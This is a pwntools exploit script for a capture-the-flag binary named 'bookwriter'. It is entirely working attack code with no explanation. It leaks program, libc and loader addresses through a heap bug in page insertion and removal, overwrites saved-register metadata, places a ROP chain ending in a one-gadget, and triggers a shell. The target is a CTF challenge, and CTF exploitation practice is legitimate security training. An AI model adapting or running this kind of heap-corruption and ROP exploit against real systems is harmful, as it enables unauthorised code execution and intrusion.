#!/usr/bin/python
from pwn import *
import sys

HOST = "chal1.sunshinectf.org"
PORT = 20002

def insert_page(content):
	r.sendline("3")
	r.recvline()
	r.sendline(content)
	r.sendline("END")

	r.recvuntil("Page number ")
	HEAP = int(r.recvuntil(":", drop=True))

	r.recvuntil("> ")

	return HEAP

def flip_prev():
	r.sendline("1")
	r.recvuntil("> ")

def flip_next():
	r.sendline("2")
	r.recvuntil("> ")

def remove_this():
	r.sendline("4")
	r.recvuntil("> ")

def publish():
	r.sendline("5")

def discard(answer, do_quit=False):
	r.sendline("0")
	r.sendlineafter("[y/N] ", answer)

	if not do_quit:
		r.recvuntil("> ")

def leak_addr(addr, len=4):
	insert_page("A"*50)
	insert_page("A"*50)
	flip_prev()
	remove_this()

	payload = p32(addr)
	payload += p8(0)

	insert_page(payload)
	flip_prev()

	r.sendline()
	r.recvuntil(":")
	LEAK = u32(r.recvuntil("What", drop=True).split("\n")[2][:len].rjust(4, "\x00"))

	r.recvuntil("> ")	
	return LEAK

def exploit(r):
	r.recvuntil("Page number ")
	PIELEAK = int(r.recvuntil(":", drop=True))
	e.address = PIELEAK - 0x26e0
	r.recvuntil(">")

	log.info("PIE leak       : %s" % hex(PIELEAK))
	log.info("PIE            : %s" % hex(e.address))

	HEAP = insert_page("A"*(0x40-4))
	LIBCLEAK = leak_addr(e.got["printf"])
	libc.address = LIBCLEAK - libc.symbols["printf"]
	ENV = leak_addr(libc.symbols["__environ"])
	LDLEAK = leak_addr(e.address + 0x25e0)
	ECX = leak_addr(LDLEAK - 0x8)
	POP4RET = e.address + 0x1008
	POPESI = libc.address + 0x00017828
	ONE = libc.address + 0x3ac5c

	log.info("HEAP leak      : %s" % hex(HEAP))
	log.info("LIBC leak      : %s" % hex(LIBCLEAK))
	log.info("LIBC           : %s" % hex(libc.address))
	log.info("ENVIRON        : %s" % hex(ENV))
	log.info("LD LEAK        : %s" % hex(LDLEAK))
	log.info("ECX            : %s" % hex(ECX))
	log.info("ONE            : %s" % hex(ONE))

	log.info("Insert book page with page metadata pointing to ECX (in main ret)")
	
	payload1 = p32(HEAP - 0x1050)
	payload1 += p32(ECX-0xbc-8)					# Target address to overwrite with chunk
	payload1 += p32(HEAP - 0xf90)
	payload1 += "\x00"*(0x40-4-len(payload1))

	ID1 = insert_page(payload1)
	ID2 = insert_page("C"*(0x40-4))
	ID3 = insert_page("\x00"*316)
	
	log.info("Insert book page with ropchain")
	
	payload = "A"*188
	payload += p32(POP4RET)
	payload += p32(1)
	payload += p32(2)
	payload += p32(3)
	payload += p32(4)	
	payload += p32(POPESI)
	payload += p32(libc.address + 0x1b2000)
	payload += p32(ONE)
	

	ID4 = insert_page(payload)

	log.info("Remove page and overwrite page metadata pointing to our fake page")
	flip_prev()
	flip_prev()

	remove_this()

	payload = p32(ID4)					# text
	payload += p32(HEAP + 0x1ec - 4)	# => target address
	payload += p16(0)

	insert_page(payload)

	log.info("Remove fake page to overwrite ECX with pointer to ropchain")

	pause()
	flip_prev()
	flip_prev()

	remove_this()

	log.info("Publish to trigger shell")
	
	publish()

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./bookwriter")
	libc = ELF("./bookwriter-libc.so")
		
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		libc = ELF("./bookwriter-libc.so")
		r = process("./bookwriter", env={"LD_PRELOAD":"./bookwriter-libc.so"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
